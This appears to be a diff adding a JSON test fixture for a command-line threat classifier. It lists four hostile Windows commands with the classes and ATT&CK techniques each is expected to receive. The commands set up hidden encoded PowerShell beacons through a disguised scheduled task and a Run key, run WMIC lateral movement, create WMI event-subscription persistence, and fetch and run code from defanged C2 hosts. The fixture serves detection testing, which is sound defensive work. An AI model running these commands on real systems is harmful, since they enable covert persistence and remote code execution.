@@ -1,0 +1,46 @@
+[
+  {
+    "id": "schtasks-hourly-beacon",
+    "description": "Scheduled task creating hourly encoded PowerShell beacon as SYSTEM",
+    "command": "schtasks /create /tn \"MicrosoftEdgeUpdateCore\" /tr \"powershell -w hidden -ep bypass -enc JABwACAAPQAgACIAaAB0AHQAcAA6AC8ALwBjADIALgByAGUAZgByAGUAcwBoAC0AcwB2AGMAWwAuAF0AbgBlAHQALwBhAGcAZQBuAHQAIgA7AGkAZQB4ACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJABwACkAKQA=\" /sc hourly /mo 2 /ru SYSTEM /f",
+    "expect": {
+      "classes": ["c2_persistence", "loader", "defense_evasion"],
+      "min_confidence": {"c2_persistence": "high", "loader": "high"},
+      "techniques": ["T1053.005", "T1059.001"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "wmic-remote-process-create",
+    "description": "WMIC /node: remote process creation — lateral movement + IEX download",
+    "command": "wmic /node:10.10.5.20 /user:CORP\\Administrator process call create \"cmd /c powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('hxxp://c2.lateral-move[.]xyz/agent.ps1'))\"",
+    "expect": {
+      "classes": ["lateral_movement", "dropper", "defense_evasion"],
+      "min_confidence": {"lateral_movement": "high", "dropper": "high"},
+      "techniques": ["T1047", "T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "wmi-event-subscription",
+    "description": "WMI FilterToConsumerBinding fileless persistence — survives reboot, no file on disk",
+    "command": "Set-WmiInstance -Namespace root\\subscription -Class __EventFilter; Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{CommandLineTemplate='cmd /c powershell -ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString(\"hxxps://c2[.]xyz/a\"))'}; Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding",
+    "expect": {
+      "classes": ["c2_persistence"],
+      "min_confidence": {"c2_persistence": "high"},
+      "techniques": ["T1546.003"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "run-key-persistence",
+    "description": "Registry Run key persistence adding encoded PowerShell beacon",
+    "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d \"powershell -w hidden -ep bypass -enc JABwACAAPQAgACIAaAB0AHQAcAA=\"  /f",
+    "expect": {
+      "classes": ["c2_persistence"],
+      "min_confidence": {"c2_persistence": "high"},
+      "techniques": ["T1547.001"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  }
+]
